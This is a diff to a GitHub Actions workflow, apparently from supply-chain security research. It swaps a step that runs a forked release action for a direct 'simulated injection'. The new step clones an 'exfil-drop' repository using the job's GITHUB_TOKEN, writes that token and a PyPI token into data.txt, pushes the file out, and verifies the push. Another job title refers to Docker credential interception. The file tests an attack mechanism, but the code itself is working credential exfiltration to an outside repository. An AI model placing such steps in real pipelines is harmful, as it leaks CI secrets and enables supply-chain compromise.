@@ -7,30 +7,45 @@ permissions:
 
 jobs:
   test-aiohttp:
-    name: "#2 aiohttp — git push exfil"
+    name: "#2 aiohttp — git push exfil (mechanism test)"
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: "Run forked create-release (injection pushes secrets to exfil-drop)"
-        uses: rafidhaque/create-release@9c00aa733c05d7d48bf22cefc110572b706f4dc4
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          pypi_token: "fake-pypi-token-for-testing"
-          type: "patch"
-          fix_version_regex: "."
-        continue-on-error: true
-
-      - name: "Verify: check if exfil-drop received data"
+      - name: "Simulate injection: clone exfil-drop, write secrets, push"
         run: |
-          git clone https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/rafidhaque/exfil-drop.git /tmp/check-exfil 2>/dev/null || true
-          if [ -f /tmp/check-exfil/data.txt ]; then
-            echo "SUCCESS: data.txt was pushed to exfil-drop"
-            cat /tmp/check-exfil/data.txt
+          echo "=== Phase 1: Clone exfil-drop ==="
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/exfil 2>&1
+          echo ""
+          echo "=== Phase 2: Write stolen secrets ==="
+          echo "pypi_token=fake-pypi-token-12345" > /tmp/exfil/data.txt
+          echo "github_token=${GITHUB_TOKEN}" >> /tmp/exfil/data.txt
+          echo "timestamp=$(date -u)" >> /tmp/exfil/data.txt
+          echo "Written to data.txt"
+          echo ""
+          echo "=== Phase 3: Push to exfil-drop ==="
+          cd /tmp/exfil
+          git config user.email "test@test.com"
+          git config user.name "test"
+          git add .
+          git commit -m "exfil data" 2>&1
+          git push 2>&1 && echo "SUCCESS: pushed to exfil-drop" || echo "FAIL: push failed (token scope issue)"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: "Verify: re-clone and check"
+        run: |
+          rm -rf /tmp/check
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/check 2>/dev/null || true
+          if [ -f /tmp/check/data.txt ]; then
+            echo "SUCCESS: data.txt found in exfil-drop"
+            echo "=== Contents ==="
+            cat /tmp/check/data.txt
           else
-            echo "Check: data.txt not found (action may have failed before injection ran)"
-            ls -la /tmp/check-exfil/ 2>/dev/null || echo "repo not cloned"
+            echo "FAIL: data.txt not in exfil-drop"
           fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
   test-compose-mechanism:
     name: "#8 compose — Docker credential interception (mechanism)"
